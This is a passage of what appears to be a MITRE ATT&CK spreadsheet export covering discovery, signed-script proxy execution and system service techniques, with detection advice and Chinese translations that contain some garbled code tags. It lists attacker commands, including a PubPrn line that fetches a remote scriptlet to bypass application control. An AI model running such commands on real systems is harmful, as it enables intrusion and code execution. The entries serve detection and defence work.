Alto OilRig May 2016),(Citation: McAfee Lazarus Nov 2020),(Citation: Check Point APT35 CharmPower January 2022),(Citation: Antiy CERT Ramsay April 2020),(Citation: Kaspersky Andariel Ransomware June 2021),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: ESET Okrum July 2019),(Citation: Kaspersky Poseidon Group),(Citation: Avira Mustang Panda January 2020),(Citation: BiZone Lizar May 2021),(Citation: NCC Group APT15 Alive and Strong),(Citation: Cybereason Cobalt Kitty 2017),(Citation: GovCERT Carbon May 2016),(Citation: Malwarebytes Konni Aug 2021),(Citation: FireEye MESSAGETAP October 2019),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: evolution of pirpi),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Unit 42 Lucifer June 2020),(Citation: GitHub Pupy),(Citation: Group IB APT 41 June 2021),(Citation: Symantec W32.Duqu),(Citation: Palo Alto CVE-2015-3113 July 2015),(Citation: Kaspersky Turla),(Citation: Symantec Buckeye),(Citation: FireEye NETWIRE March 2019),(Citation: ESET ComRAT May 2020),(Citation: Cybereason Soft Cell June 2019),(Citation: PWC Cloud Hopper April 2017),(Citation: Talos GravityRAT),(Citation: FOX-IT May 2016 Mofang),(Citation: NTT Security Flagpro new December 2021),(Citation: GitHub PoshC2),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Symantec Orangeworm April 2018),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: Mandiant APT1),(Citation: Trend Micro TeamTNT),(Citation: Savill 1999),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: CarbonBlack Conti July 2020),(Citation: ESET Machete July 2019),(Citation: TechNet Netstat),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: FireEye APT41 Aug 2019),(Citation: FireEye APT38 Oct 2018),(Citation: F-Secure BlackEnergy 2014),(Citation: Trend Micro Muddy Water March 2021),(Citation: Securelist BlackEnergy Nov 2014),(Citation: Dragos Crashoverride 2018),(Citation: NCC Group Chimera January 2021),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: GitHub Sliver Netstat),",系统网络连接发现,攻击者可能会尝试通过在网络上查询信息来获取与他们当前正在访问的受感染系统或来自远程系统的网络连接列表。获得对属于基于云的环境的一部分的系统的访问权限的对手可能会绘制出虚拟私有云或虚拟网络，以确定连接了哪些系统和服务。执行的操作可能是相同类型的发现技术，具体取决于操作系统，但生成的信息可能包括与对手目标相关的网络云环境的详细信息。云提供商可能有不同的虚拟网络运行方式。（引用：亚马逊 AWS VPC 指南）（引用：Microsoft Azure 虚拟网络概述）（引用：谷歌 VPC 概述）同样，获得网络设备访问权限的对手也可能执行类似的操作发现活动以收集有关连接的系统和服务的信息。获取此信息的实用程序和命令包括 [netstat](https://attack.mitre.org/software/S0104)、“net use”和与 [Net](https://attack.mitre. org/software/S0039）。在 Mac 和 Linux 中，[netstat](https://attack.mitre.org/software/S0104) 和 <code>lsof</code> 可用于列出当前连接。 <code>who -a</code> 和 <code>w</code> 可用于显示当前登录的用户，类似于“net session”。此外，可以使用网络设备和 [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) 的内置功能（例如 <code>show ip sockets</code>、<代码>show tcp brief</代码>）。（引用：US-CERT-TA18-106A）
T1033,System Owner/User Discovery,"Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

Various utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.",https://attack.mitre.org/techniques/T1033,31 May 2017,20 April 2022,1.3,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","Linux, Windows, macOS","Active Directory: Active Directory Object Access, Command: Command Execution, File: File Access, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: OS API Execution, Process: Process Access, Process: Process Creation, Windows Registry: Windows Registry Key Access",False,,,,,,,CAPEC-577,,,"(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Cyberreason Anchor December 2019),(Citation: Unit 42 MechaFlounder March 2019),(Citation: FireEye APT32 May 2017),(Citation: Cybereason Valak May 2020),(Citation: Fidelis njRAT June 2013),(Citation: Cylance Shaheen Nov 2018),(Citation: TrendMicro TropicTrooper 2015),(Citation: Sophos New Ryuk Attack October 2020),(Citation: Kaspersky Lyceum October 2021),(Citation: FoxIT Wocao December 2019),(Citation: ESET RTM Feb 2017),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Securelist Octopus Oct 2018),(Citation: RATANKBA),(Citation: ESET Zebrocy Nov 2018),(Citation: ThreatExpert Agent.btz),(Citation: Kaspersky QakBot September 2021),(Citation: ESET Operation Groundbait),(Citation: FSecure Lokibot November 2019),(Citation: Talos Micropsia June 2017),(Citation: Cybereason Chaes Nov 2020),(Citation: FireEye Operation Double Tap),(Citation: Novetta Blockbuster),(Citation: Palo Alto T9000 Feb 2016),(Citation: Unit 42 DarkHydrus July 2018),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Google EXOTIC LILY March 2022),(Citation: Trend Micro DRBControl February 2020),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: BlackBerry CostaRicto November 2020),(Citation: ESET ForSSHe December 2018),(Citation: Fortinet Agent Tesla April 2018),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: Prevailion DarkWatchman 2021),(Citation: Unit 42 C0d0so0 Jan 2016),(Citation: FireEye APT34 Dec 2017),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Forcepoint Monsoon),(Citation: Proofpoint TA505 Jan 2019),(Citation: Sofacy Komplex Trojan),(Citation: Unit 42 NOKKI Sept 2018),(Citation: Symantec Chafer Dec 2015),(Citation: Malwarebytes Agent Tesla April 2020),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: McAfee Sharpshooter December 2018),(Citation: CheckPoint Naikon May 2020),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Secureworks Karagany July 2019),(Citation: Unit42 Molerat Mar 2020),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: Symantec Dragonfly),(Citation: FireEye FIN10 June 2017),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: McAfee Night Dragon),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: Kaspersky Turla Aug 2014),(Citation: Novetta Blockbuster RATs),(Citation: Cybereason StrifeWater Feb 2022),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: Profero APT27 December 2020),(Citation: McAfee Gold Dragon),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Palo Alto OilRig May 2016),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Unit 42 VERMIN Jan 2018),(Citation: Zscaler Lyceum DnsSystem June 2022),(Citation: Proofpoint TA505 October 2019),(Citation: DigiTrust Agent Tesla Jan 2017),(Citation: Github Koadic),(Citation: Cymmetria Patchwork),(Citation: ESET Okrum July 2019),(Citation: Unit 42 Kazuar May 2017),(Citation: BiZone Lizar May 2021),(Citation: FireEye HAWKBALL Jun 2019),(Citation: Palo Alto Reaver Nov 2017),(Citation: BlackBerry Amadey 2020),(Citation: Check Point APT34 April 2021),(Citation: Cybereason Cobalt Kitty 2017),(Citation: ESET Grandoreiro April 2020),(Citation: US-CERT TA18-074A),(Citation: Talent-Jump Clambling February 2020),(Citation: ClearSky Charming Kitten Dec 2017),(Citation: Talos Konni May 2017),(Citation: Microsoft PLATINUM April 2016),(Citation: Baumgartner Naikon 2015),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: APT15 Intezer June 2018),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Cylance Dust Storm),(Citation: FireEye APT37 Feb 2018),(Citation: Mandiant UNC3313 Feb 2022),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Trend Micro IXESHE 2012),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Unit 42 QUADAGENT July 2018),(Citation: fsecure NanHaiShu July 2016),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Unit 42 RGDoor Jan 2018),(Citation: FireEye APT32 April 2020),(Citation: Anomali Linux Rabbit 2018),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Microsoft NICKEL December 2021),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Talos Group123),(Citation: Lazarus APT January 2022),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: Unit 42 Lucifer June 2020),(Citation: NCC Group Team9 June 2020),(Citation: Unit42 Azorult Nov 2018),(Citation: GitHub Pupy),(Citation: Securelist MuddyWater Oct 2018),(Citation: ATT Sidewinder January 2021),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: Talos Oblique RAT March 2021),(Citation: Unit42 Cannon Nov 2018),(Citation: Proofpoint TA505 Mar 2018),(Citation: ESET InvisiMole June 2018),(Citation: Palo Alto MoonWind March 2017),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Cybereason Soft Cell June 2019),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: Talos GravityRAT),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: ESET OceanLotus),(Citation: Novetta Blockbuster Loaders),(Citation: Talos ZxShell Oct 2014),(Citation: Intrinsec Egregor Nov 2020),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: Group IB GrimAgent July 2021),(Citation: Prevailion EvilNum May 2020),(Citation: Korean FSI TA505 2020),(Citation: NTT Security Flagpro new December 2021),(Citation: FireEye SMOKEDHAM June 2021),(Citation: Securelist APT10 March 2021),(Citation: ESET Dukes October 2019),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: Fortinet Diavol July 2021),(Citation: Volexity PowerDuke November 2016),(Citation: Symantec Orangeworm April 2018),(Citation: SentinelOne Lazarus macOS July 2020),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: ESET DazzleSpy Jan 2022),(Citation: Securelist Denis April 2017),(Citation: Talos PoetRAT April 2020),(Citation: TrendMicro DarkComet Sept 2014),(Citation: ESET Gelsemium June 2021),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: Debian nbtscan Nov 2019),(Citation: CISA WellMail July 2020),(Citation: Forcepoint Felismus Mar 2017),(Citation: SecTools nbtscan June 2003),(Citation: Fidelis Turbo),(Citation: ClearSky Siamesekitten August 2021),(Citation: Talos Frankenstein June 2019),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Microsoft POLONIUM June 2022),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: TrendMicro EarthLusca 2022),(Citation: Kaspersky WIRTE November 2021),(Citation: NCSC GCHQ Small Sieve Jan 2022),(Citation: FireEye APT41 Aug 2019),(Citation: FireEye FELIXROOT July 2018),(Citation: ESET Casbaneiro Oct 2019),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Talos Cobalt Group July 2018),(Citation: FireEye APT10 Sept 2018),(Citation: XAgentOSX 2017),(Citation: ClearSky Lazarus Aug 2020),(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: ASERT Donot March 2018),(Citation: Unit42 BabyShark Feb 2019),(Citation: Trend Micro Muddy Water March 2021),(Citation: Mandiant APT1 Appendix),(Citation: Securelist WhiteBear Aug 2017),(Citation: NCC Group Chimera January 2021),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: ESET GreyEnergy Oct 2018),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: CISA WellMess July 2020),(Citation: CISA Zebrocy Oct 2020),(Citation: ANSSI Sandworm January 2021),(Citation: Carbon Black HotCroissant April 2020),(Citation: Novetta Blockbuster Destructive Malware),(Citation: BlackBerry Bahamut),(Citation: Malwarebytes Dyreza November 2015),(Citation: CrowdStrike BloodHound April 2018),(Citation: Palo Alto OilRig Oct 2016),",系统所有者/用户发现,攻击者可能会尝试识别主要用户、当前登录用户、通常使用系统的用户集，或者用户是否正在积极使用系统。他们可能会这样做，例如，通过检索帐户用户名或使用 [OS Credential Dumping](https://attack.mitre.org/techniques/T1003)。可以使用其他发现技术以多种不同方式收集信息，因为用户和用户名详细信息在整个系统中普遍存在，包括正在运行的进程所有权、文件/目录所有权、会话信息和系统日志。攻击者可以在自动发现期间使用来自 [系统所有者/用户发现](https://attack.mitre.org/techniques/T1033) 的信息来塑造后续行为，包括攻击者是否完全感染目标和/或尝试特定的动作。各种实用程序和命令可以获取此信息，包括 <code>whoami</code>。在 macOS 和 Linux 中，当前登录的用户可以通过 <code>w</code> 和 <code>who</code> 来识别。在 macOS 上， <code>dscl . list /Users | grep -v '_'</code> 命令也可用于枚举用户帐户。 <code>%USERNAME%</code> 和 <code>$USER</code> 等环境变量也可用于访问此信息。
T1216,System Script Proxy Execution,"Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files.(Citation: LOLBAS Project) This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.(Citation: GitHub Ultimate AppLocker Bypass List)",https://attack.mitre.org/techniques/T1216,18 April 2018,18 April 2022,2.0,Defense Evasion,"Monitor script processes, such as `cscript`, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.",Windows,"Command: Command Execution, Process: Process Creation, Script: Script Execution",False,,"Application control, Digital Certificate Validation",Praetorian; Wes Hurd,,,,,,,",",系统脚本代理执行/利用已签名脚本代理执行,攻击者可能会使用受信任的脚本（通常使用证书签名）来代理恶意文件的执行。已从 Microsoft 下载或默认安装在 Windows 上的多个 Microsoft 签名脚本可用于代理其他文件的执行。（引用：LOLBAS 项目）攻击者可能会滥用此行为来执行可能绕过应用程序控制和签名的恶意文件系统验证。（引用：GitHub Ultimate AppLocker 绕过列表）
T1216.001,System Script Proxy Execution: PubPrn,"Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation: pubprn)

Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.

In later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).",https://attack.mitre.org/techniques/T1216/001,03 February 2020,18 April 2022,2.0,Defense Evasion,"Monitor script processes, such as `cscript`, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.",Windows,"Command: Command Execution, Process: Process Creation, Script: Script Execution",True,T1216,"Application Control, Digital Certificate Validation","Atul Nair, Qualys",,,,,,,"(Citation: Twitter ItsReallyNick Status Update APT32 PubPrn),(Citation: Microsoft_rec_block_rules)",系统脚本代理执行/利用已签名脚本代理执行：PubPrn,"攻击者可能会使用 PubPrn 来代理恶意远程文件的执行。 PubPrn.vbs 是一个 [Visual Basic](https://attack.mitre.org/techniques/T1059/005) 脚本，用于将打印机发布到 Active Directory 域服务。该脚本可能由 Microsoft 签名，通常通过 <code>Cscript.exe</code> 通过 [Windows 命令外壳](https://attack.mitre.org/techniques/T1059/003) 执行。例如，以下代码在指定域内发布打印机：<code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation: pubprn) 攻击者可能会滥用 PubPrn 来执行托管在远程站点上的恶意负载。（引用：Enigma0x3 PubPrn 绕过）为此，攻击者可以设置第二个 <code>script:</code> 参数以引用托管在远程站点上的脚本文件 (.sct)。一个示例命令是 <code>pubprn.vbs 127.0.0.1 脚本：https://mydomain.com/folder/file.sct</code>。此行为可能会绕过签名验证限制和不考虑滥用此脚本的应用程序控制解决方案。在更高版本的 Windows (10+) 中，<code>PubPrn.vbs</code> 已更新，以防止从远程站点执行代理。这是通过将第二个参数中指定的协议限制为 <code>LDAP://</code> 来完成的，而 <code>script:</code> 名字对象可用于通过 HTTP(S) 引用远程代码."
T1007,System Service Discovery,"Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as <code>sc query</code>, <code>tasklist /svc</code>, <code>systemctl --type=service</code>, and <code>net start</code>.

Adversaries may use the information from [System Service Discovery](https://attack.mitre.org/techniques/T1007) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",https://attack.mitre.org/techniques/T1007,31 May 2017,15 July 2022,1.4,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","Linux, Windows, macOS","Command: Command Execution, Process: OS API Execution, Process: Process Creation",False,,,"Harshal Tupsamudre, Qualys",,,,CAPEC-574,,,"(Citation: Trend Micro IXESHE 2012),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Crowdstrike Indrik November 2018),(Citation: Mandiant APT1),(Citation: Kaspersky Adwind Feb 2016),(Citation: McAfee Cuba April 2021),(Citation: FireEye APT37 Feb 2018),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Savill 1999),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: S2 Grupo TrickBot June 2017),(Citation: FoxIT Wocao December 2019),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Microsoft Tasklist),(Citation: Trend Micro Tick November 2019),(Citation: RATANKBA),(Citation: Kaspersky Turla),(Citation: Lotus Blossom Jun 2015),(Citation: TrendMicro EarthLusca 2022),(Citation: Palo Alto OilRig May 2016),(Citation: ESET InvisiMole June 2018),(Citation: AlienVault Sykipot 2011),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: Palo Alto Networks BBSRAT),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Kaspersky Lab SynAck May 2018),(Citation: TrendMicro Ursnif Mar 2015),(Citation: Unit42 Emissary Panda May 2019),(Citation: McAfee Babuk February 2021),(Citation: Talos GravityRAT),(Citation: US-CERT Volgmer Nov 2017),(Citation: Talos ZxShell Oct 2014),(Citation: Palo Alto Comnie),(Citation: Talos Kimsuky Nov 2021),(Citation: Kaspersky Poseidon Group),(Citation: Symantec Hydraq Jan 2010),(Citation: Bitdefender Naikon April 2021),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: GitHub PoshC2),(Citation: NCC Group Chimera January 2021),(Citation: Symantec WastedLocker June 2020),(Citation: Symantec Trojan.Hydraq Jan 2010),(Citation: Intel 471 REvil March 2020),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: BlackBerry CostaRicto November 2020),(Citation: ESET GreyEnergy Oct 2018),(Citation: FireEye admin@338),(Citation: Microsoft PLATINUM April 2016),(Citation: Carbon Black HotCroissant April 2020),(Citation: Symantec Orangeworm April 2018),(Citation: F-Secure The Dukes),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: Cisco Talos Intelligence Group),(Citation: Cylance Dust Storm),(Citation: Emissary Trojan Feb 2016),(Citation: Malwarebytes Dyreza November 2015),",系统服务发现,"攻击者可能会尝试收集有关已注册本地系统服务的信息。攻击者可以使用工具以及操作系统实用程序命令（例如 <code>sc query</code>、<code>tasklist /svc</code>、<code>systemctl --type=service</code> 获取有关服务的信息, 和 <code>net start</code>。攻击者可以在自动发现期间使用来自 [系统服务发现](https://attack.mitre.org/techniques/T1007) 的信息来塑造后续行为，包括攻击者是否完全感染目标和/或尝试具体行动。"
T1569,System Services,"Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services either locally or remotely. Many services are set to run at boot, which can aid in achieving persistence ([Create or Modify System Process](https://attack.mitre.org/techniques/T1543)), but adversaries can also abuse services for one-time or temporary execution.",https://attack.mitre.org/techniques/T1569,10 March 2020,22 March 2022,1.2,Execution,"Monitor for command line invocations of tools capable of modifying services that doesn’t correspond to normal usage patterns and known software, patch cycles, etc. Also monitor for changes to executables and other files associated with services. Changes to Windows services may also be reflected in the Registry.","Linux, Windows, macOS","Command: Command Execution, File: File Modification, Process: Process Creation, Service: Service Creation, Windows Registry: Windows Registry Key Modification",False,,,,"Administrator, root, SYSTEM, User",1.0,,,,,"(Citation: Cisco Talos Intelligence Group),(Citation: win10_asr)",系统服务,攻击者可能滥用系统服务或守护程序来执行命令或程序。攻击者可以通过在本地或远程与服务交互或创建服务来执行恶意内容。许多服务设置为在启动时运行，这有助于实现持久性（[创建或修改系统进程](https://attack.mitre.org/techniques/T1543)），但攻击者也可以一次性滥用服务或临时执行。
T1569.001,System Services: Launchctl,"Adversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.(Citation: Launchctl Man)

Adversaries use launchctl to execute commands and programs as [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s. Common subcommands include: <code>launchctl load</code>,<code>launchctl unload</code>, and <code>launchctl start</code>. Adversaries can use scripts or manually run the commands <code>launchctl load -w ""%s/Library/LaunchAgents/%s""</code> or <code>/bin/launchctl load</code> to execute [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s.(Citation: Sofacy Komplex Trojan)(Citation: 20 macOS Common Tools and Techniques)
",https://attack.mitre.org/techniques/T1569/001,10 March 2020,15 October 2021,1.1,Execution,"Every Launch Agent and Launch Daemon must have a corresponding plist file on disk which can be monitored. Monitor for recently modified or created plist files with a significant change to the executable path executed with the command-line <code>launchctl</code> command. Plist files are located in the root, system, and users <code>/Library/LaunchAgents</code> or <code>/Library/LaunchDaemons</code> folders. 

Monitor command-line execution of the <code>launchctl</code> command immediately followed by abnormal network connections. [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s with executable paths pointing to <code>/tmp</code> and <code>/Shared</code> folders locations are potentially suspicious. 

When removing [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s ensure the services are unloaded prior to deleting plist files.",macOS,"Command: Command Execution, File: File Modification, Process: Process Creation, Service: Service Creation",True,T1569,,,"root, User",,,,,,"(Citation: Securelist Calisto July 2018),(Citation: trendmicro xcsset xcode project 2020),(Citation: SentinelLabs reversing run-only applescripts 2021),(Citation: ESET LoudMiner June 2019),(Citation: CISA AppleJeus Feb 2021),",系统服务：Launchctl,"攻击者可能会滥用 launchctl 来执行命令或程序。 Launchctl 与 macOS 的服务管理框架 launchd 交互。 Launchctl 支持在命令行上以交互方式获取子命令，甚至从标准输入重定向。（引用：Launchctl Man）攻击者使用 launchctl 作为 [Launch Agent] 执行命令和程序（https://attack.mitre.org/techniques /T1543/001)s 或 [启动守护程序](https://attack.mitre.org/techniques/T1543/004)s。常见的子命令包括：<code>launchctl load</code>、<code>launchctl unload</code> 和 <code>launchctl start</code>。攻击者可以使用脚本或手动运行命令 <code>launchctl load -w ""%s/Library/LaunchAgents/%s""</code> 或 <code>/bin/launchctl load</code> 来执行 [Launch Agent] (https://attack.mitre.org/techniques/T1543/001)s 或 [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s。（引用：Sofacy Komplex 木马）（引用：20 个 macOS 常用工具和技术）"
T1569.002,System Services: Service Execution,"Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services.(Citation: Microsoft Service Control Manager) The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](https://attack.mitre.org/software/S0039).

[PsExec](https://attack.mitre.org/software/S0029) can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.(Citation: Russinovich Sysinternals) Tools such as [PsExec](https://attack.mitre.org/software/S0029) and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution.

Adversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003) during service persistence or privilege escalation.",https://attack.mitre.org/techniques/T1569/002,10 March 2020,30 August 2021,1.1,Execution,"Changes to service Registry entries and command line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [PsExec](https://attack.mitre.org/software/S0029).",Windows,"Command: Command Execution, Process: Process Creation, Service: Service Creation, Windows Registry: Windows Registry Key Modification",True,T1569,,,"Administrator, SYSTEM",1.0,,,,,"(Citation: NCC Group WastedLocker June 2020),(Citation: Cyberreason Anchor December 2019),(Citation: SecureList Silence Nov 2017),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: FireEye FIN6 Apr 2019),(Citation: US-CERT NotPetya 2017),(Citation: Savill 1999),(Citation: Github PowerShell Empire),(Citation: FoxIT Wocao December 2019),(Citation: DFIR Ryuk's Return October 2020),(Citation: RedCanary Mockingbird May 2020),(Citation: Symantec Hydraq Persistence Jan 2010),(Citation: SentinelOne Hermetic Wiper February 2022),(Citation: Sophos Ragnar May 2020),(Citation: ESET Hermetic Wizard March 2022),(Citation: Impacket Tools),(Citation: GitHub Pupy),(Citation: Group IB APT 41 June 2021),(Citation: xCmd),(Citation: Unit 42 WhisperGate January 2022),(Citation: Gh0stRAT ATT March 2019),(Citation: ESET InvisiMole June 2020),(Citation: BitDefender Chafer May 2020),(Citation: Symantec Buckeye),(Citation: ESET LoudMiner June 2019),(Citation: ESET OceanLotus Mar 2019),(Citation: Palo Alto Networks BBSRAT),(Citation: Talos Promethium June 2020),(Citation: Bitdefender StrongPity June 2020),(Citation: Sophos Netwalker May 2020),(Citation: Unit42 Emissary Panda May 2019),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: Talos Nyetya June 2017),(Citation: Talos Olympic Destroyer 2018),(Citation: McAfee Shamoon December19 2018),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Novetta Winnti April 2015),(Citation: Talos ZxShell Oct 2014),(Citation: cobaltstrike manual),(Citation: Group IB Silence Sept 2018),(Citation: Medium Anchor DNS July 2020),(Citation: Github Koadic),(Citation: ESET Okrum July 2019),(Citation: DFIR Ryuk in 5 Hours October 2020),(Citation: Microsoft Wingbird Nov 2017),(Citation: Microsoft SIR Vol 21),(Citation: McAfee GhostSecret),(Citation: GitHub PoshC2),(Citation: CERT-FR PYSA April 2020),(Citation: FireEye APT41 March 2020),(Citation: NCC Group Chimera January 2021),(Citation: NCC Group APT15 Alive and Strong),(Citation: McAfee Honeybee),(Citation: Symantec Chafer February 2018),(Citation: ESET Attor Oct 2019),(Citation: Trend Micro DRBControl February 2020),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: Qualys Hermetic Wiper March 2022),(Citation: Medium S2W WhisperGate January 2022),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: Secpod Winexe June 2017),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: Cylance Cleaver),(Citation: Talos TinyTurla September 2021),(Citation: Palo Alto Shamoon Nov 2016),(Citation: Russinovich Sysinternals),(Citation: win10_asr)",系统服务：服务执行,攻击者可能会滥用 Windows 服务控制管理器来执行恶意命令或负载。 Windows 服务控制管理器 (<code>services.exe</code>) 是管理和操作服务的接口。（引用：Microsoft 服务控制管理器）用户可以通过 GUI 